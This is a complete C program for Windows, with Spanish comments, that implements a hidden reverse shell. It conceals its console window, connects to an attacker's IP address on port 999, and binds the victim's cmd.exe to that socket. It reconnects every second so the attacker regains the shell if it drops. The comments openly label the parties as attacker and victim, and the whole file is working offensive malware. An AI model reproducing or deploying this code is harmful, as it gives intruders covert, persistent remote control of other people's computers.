//Argumento al compilador: -lws2_32
#define _WIN32_WINNT 0x0500
#include <winsock2.h> 
#include <stdio.h> 

int main(int argc, char *argv[]) 
{ 
    HWND hWnd = GetConsoleWindow();
   	ShowWindow( hWnd, SW_HIDE ); //Escondemos la ejecuci�n del 
	   							//programa de la vista del usuario.
 
again:  //Bucle tipo goto.
      
    WSADATA wsaData; 
    SOCKET hSocket; 
    STARTUPINFO si; 
    PROCESS_INFORMATION pi; 
    struct sockaddr_in adik_sin; 
    memset(&adik_sin,0,sizeof(adik_sin)); 
    memset(&si,0,sizeof(si)); 
    WSAStartup(MAKEWORD(2,0),&wsaData); 
    hSocket = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL); 
    adik_sin.sin_family = AF_INET; 
    adik_sin.sin_port = htons(999); //Definimos puerto del host remoto (atacante) 
									//donde se brindar� la shell de comandos del usuario (v�ctima).
    adik_sin.sin_addr.s_addr = inet_addr("192.168.1.150"); //Definimos la direcci�n IP del 
															//host remoto (atacante).
    connect(hSocket,(struct sockaddr*)&adik_sin,sizeof(adik_sin)); 
    si.cb = sizeof(si); 
	si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket; 
    CreateProcess(NULL,"cmd",NULL,NULL,true,NULL,NULL,NULL,&si,&pi); //Definimos el proceso (programa) 
													//que al cual se le dar� acceso al host remoto (atacante). 
													//En este caso ser� "cmd.exe" de la v�ctima.
    
	Sleep(1000);//Definimos esta funci�n de espera para que vuelva a realizar la conexi�n. 
				//De esta manera si se pierde la Shell de la v�ctima, 
				//a los X segundos el atacante la volver� a conseguir.
	
goto again; //Vuelve a ejecutar las instrucciones anteriores a partir de la etiqueta "again".
} 
